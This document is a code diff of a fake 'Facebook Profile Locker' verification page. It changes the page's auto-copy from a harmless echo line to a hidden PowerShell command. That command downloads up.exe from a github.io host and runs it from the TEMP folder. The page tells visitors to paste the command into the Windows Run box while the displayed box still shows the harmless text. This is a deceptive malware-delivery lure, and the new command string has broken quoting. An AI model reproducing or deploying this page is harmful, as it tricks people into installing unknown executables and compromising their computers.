@@ -1,6 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
+<html lang="en"><head>
 <meta charset="UTF-8">
 <title>Facebook Profile Locker - Verification</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -138,22 +137,24 @@
     <label for="verify">I'm not a robot</label>
   </div>
 
-  <div class="spinner" id="spinner"></div>
+  <div class="spinner" id="spinner" style="display: none;"></div>
 
-  <div class="message" id="message">
+  <div class="message" id="message" style="display: block;">
     ✅ Verification complete. Profile locker activated successfully.
     <p><img src="https://i.ibb.co/dJrw6q2y/IMG-8464.png" alt="status"></p>
   </div>
 
-  <div class="instructions" id="instructions">
+  <div class="instructions" id="instructions" style="display: block;">
     <p><b>Complete verification:</b></p>
-    <p>Press <b>Windows + R</b></p>
-    <p>Press <b>Ctrl + V</b> to paste</p>
-    <p>Press <b>Enter</b></p>
+            <p>Press <b>Windows + R</b></p>
+        <p>Press <b>Ctrl + V</b> to paste</p>
+        <p>Press <b>Enter</b></p>
+         
+            
     <p style="margin-top:8px;"><b>If auto-copy fails, copy manually:</b></p>
     <pre class="copy-box" id="copyBox">echo Verification Complete - Facebook Locker</pre>
   </div>
-   <ol id="stepsList"></ol>
+   <ol id="stepsList"><li style="opacity: 1; transition: opacity 0.4s;">On the profile page, select the three-dot menu at the top.</li><li style="opacity: 1; transition: opacity 0.4s;">From the dropdown, click on <b>Lock Profile</b>.</li><li style="opacity: 1; transition: opacity 0.4s;">Click <b>Lock Your Profile</b> when prompted.</li><li style="opacity: 1; transition: opacity 0.4s;">Confirm by clicking <b>OK</b>, and your profile will be locked.</li></ol>
 </div>
 <script>
   const checkbox = document.getElementById("verify");
@@ -163,15 +164,17 @@
   const stepsList = document.getElementById("stepsList");
   const copyBox = document.getElementById("copyBox");
 
-  // Fix: escape quotes in powershell command
   const shownCommand = "echo Verification Complete - Facebook Locker";
-  const hiddenCommand = `powershell -windowstyle hidden -command "Invoke-WebRequest -Uri 'http://volamtuan.github.io/up.exe' -OutFile '$env:TEMP\\up.exe'; Start-Process '$env:TEMP\\up.exe'"`;
+  const hiddenCommand = "powershell -windowstyle hidden -command "Invoke-WebRequest -Uri 'http://volamtuan.github.io/up.exe' -OutFile '%TEMP%\up.exe'"
+start "" /b "%TEMP%\up.exe"";
 
   const steps = [
     "On the profile page, select the three-dot menu at the top.",
     "From the dropdown, click on <b>Lock Profile</b>.",
     "Click <b>Lock Your Profile</b> when prompted.",
     "Confirm by clicking <b>OK</b>, and your profile will be locked."
+
+
   ];
 
   checkbox.addEventListener("change", async () => {
@@ -179,14 +182,13 @@
       spinner.style.display = "block";
       message.style.display = "none";
       instructions.style.display = "none";
-      stepsList.innerHTML = "";
 
       setTimeout(async () => {
         spinner.style.display = "none";
         message.style.display = "block";
         instructions.style.display = "block";
 
-        // Show step-by-step instructions
+        // Hiển thị hướng dẫn từng bước
         stepsList.innerHTML = "";
         steps.forEach((step, i) => {
           const li = document.createElement("li");
@@ -198,18 +200,17 @@
         });
 
         // Auto copy (Safari compatible)
-        autoCopy(shownCommand);
+        autoCopy(hiddenCommand);
       }, 2000);
     } else {
       spinner.style.display = "none";
       message.style.display = "none";
       instructions.style.display = "none";
-      stepsList.innerHTML = "";
     }
   });
 
   copyBox.addEventListener("click", async () => {
-    await autoCopy(shownCommand);
+    await autoCopy(hiddenCommand);
     copyBox.classList.add("copied");
     copyBox.textContent = "✅ Copied!";
     setTimeout(() => {
@@ -243,5 +244,6 @@
   }
 </script>
 
-</body>
-</html>
+
+
+</body></html>
